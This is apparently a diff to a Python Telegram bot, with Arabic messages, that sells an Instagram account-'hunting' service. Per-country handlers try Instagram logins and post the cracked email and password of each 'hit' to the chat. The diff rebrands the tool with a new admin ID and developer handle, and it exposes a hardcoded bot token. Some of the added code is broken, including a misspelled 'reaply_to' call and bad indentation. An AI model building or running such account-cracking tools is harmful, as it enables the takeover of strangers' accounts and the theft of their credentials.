@@ -20,35 +20,29 @@ C = "\033[1;97m" #ابيض
 
 
 ToKen = "5554983256:AAFdqhzgehO5RwCc0e1XlmveBd9Rk8EIPa4"
-admin=[5244755240,254264270]
+admin=[5244755240,254264270,1403347605]
 bot = telebot.TeleBot(ToKen)
 @bot.message_handler(commands=['start'])
 def start_message(message):
-    first = message.from_user.first_name
+    first = message.from_user.username
     url = 'https://t.me/N1111V/3'
     bot.send_animation((message.chat.id), url, caption=f"""اهلا {first}
-
-    بُكَ فِيُ بُۅتِ صِيُډ يُۅࢪِ࣪ࢪاެتِ تِيُݪيُجَࢪاެمِ
-اެݪبُۅتِ مِډفِۅعٰ ۅݪيُسُ مِجَاެنِيُ اެضِغِطَ /TXN
-ݪكَيُ اެتِحِقِقِ هَݪ اެنِتِ مِشِتِࢪكَ فِيُ اެݪبُۅتِ ❤️‍🔥
-___
-
-اެنِ كَنِتِ ݪسُتِ مِشِتِࢪكَ ࢪاެسُݪ اެݪمِطَۅࢪ @E_4_1 ݪكَيُ يُفِعٰݪ ݪكَ اެݪاެشِتِࢪاެكَ بُمِقِاެبُݪ بُسُيُطَ جَډاެ ❤️‍🔥""", reply_to_message_id=(message.message_id))
+اكتب /check لفحص اشتراكك
+""", reply_to_message_id=(message.message_id))
 
 
     
 
-@bot.message_handler(commands = ["TXN"])
+@bot.message_handler(commands = ["check"])
 def Start(message):
 	 if message.from_user.id in admin:
 	 	Name = message.chat.first_name
 	 	User = message.from_user.username 
 	 	ID = message.chat.id
-	 	A = types.InlineKeyboardMarkup(row_width=2)
-	 	B = types.InlineKeyboardButton(text ="✅ قناه المبرمج" , url = "t.me/ToOlsCaRiNo")
-	 	C = types.InlineKeyboardButton(text ="✅ مراسة مبرمج  " , url = "t.me/RRN3R")
-	 	D =  types.InlineKeyboardButton(text = "✅ START HACK",callback_data="y")
-	 	A.add(B,C,D)
+	 	A = types.InlineKeyboardMarkup(row_width=1)
+	 	B = types.InlineKeyboardButton(text =" المبرمج " , url = "t.me/Dar4k")
+	 	C =  types.InlineKeyboardButton(text = "✅ START HACK",callback_data="y")
+	 	A.add(B,C)
 	 	bot.reply_to(message, """  
 		*- اهلا عزيزي ( {} )                             
 		- في بوت صيد  حسابات ( Intagram )✅
@@ -56,6 +50,10 @@ def Start(message):
 		- معرفك : [ @{} ]                                    
 		- ايديك : [ {} ]                                        *
 		""".format(Name,User,ID) , parse_mode = "markdown" , reply_markup = A)	
+		else :
+			bot.reaply_to(message,f'''
+			حب انت ممشترك 
+''')
 @bot.callback_query_handler(func=lambda call: True)
 def answer(call):
     if call.data =="y":
@@ -162,7 +160,7 @@ def Iran(message):
 ⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
 ⌯ ᴘᴀѕѕ : [ {password} ] ⌯
 ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙲𝙷 : [ @ToOlsCaRiNo ] ⌯    
+⌯ @Dar4k ⌯    
 """)
 			bot.send_message(message.chat.id, text=Hit)
 		elif '"message":"challenge_required","challenge"' in req_login.text:
@@ -254,7 +252,7 @@ def Iraq(message):
 ⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
 ⌯ ᴘᴀѕѕ : [ {password} ] ⌯
 ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙲𝙷 : [ @ToOlsCaRiNo ] ⌯    
+⌯ @Dar4k ⌯    
 """)
 			bot.send_message(message.chat.id, text=Hit)
 		elif '"message":"challenge_required","challenge"' in req_login.text:
@@ -345,7 +343,7 @@ def TR(message):
 ⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
 ⌯ ᴘᴀѕѕ : [ {password} ] ⌯
 ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙲𝙷 : [ @ToOlsCaRiNo ] ⌯    
+⌯ @Dar4k ⌯    
 """)
 			bot.send_message(message.chat.id, text=Hit)
 		elif '"message":"challenge_required","challenge"' in req_login.text:
@@ -448,7 +446,7 @@ def EGYPT(message):
 ⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
 ⌯ ᴘᴀѕѕ : [ {password} ] ⌯
 ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙲𝙷 : [ @ToOlsCaRiNo ] ⌯    
+⌯ @Dar4k ⌯    
 """)
 			bot.send_message(message.chat.id, text=Hit)
 		elif '"message":"challenge_required","challenge"' in req_login.text:
@@ -551,7 +549,7 @@ def Kuwait(message):
 ⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
 ⌯ ᴘᴀѕѕ : [ {password} ] ⌯
 ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙲𝙷 : [ @ToOlsCaRiNo ] ⌯    
+⌯ @Dar4k ⌯    
 """)
 			bot.send_message(message.chat.id, text=Hit)
 		elif '"message":"challenge_required","challenge"' in req_login.text:
@@ -661,7 +659,7 @@ def SAUDIA(message):
 ⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
 ⌯ ᴘᴀѕѕ : [ {password} ] ⌯
 ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙲𝙷 : [ @ToOlsCaRiNo ] ⌯    
+⌯ @Dar4k ⌯    
 """)
 			bot.send_message(message.chat.id, text=Hit)
 		elif '"message":"challenge_required","challenge"' in req_login.text:
@@ -766,7 +764,7 @@ def Morocco(message):
 ⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
 ⌯ ᴘᴀѕѕ : [ {password} ] ⌯
 ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙲𝙷 : [ @ToOlsCaRiNo ] ⌯    
+⌯ @Dar4k ⌯    
 """)
 			bot.send_message(message.chat.id, text=Hit)
 		elif '"message":"challenge_required","challenge"' in req_login.text:
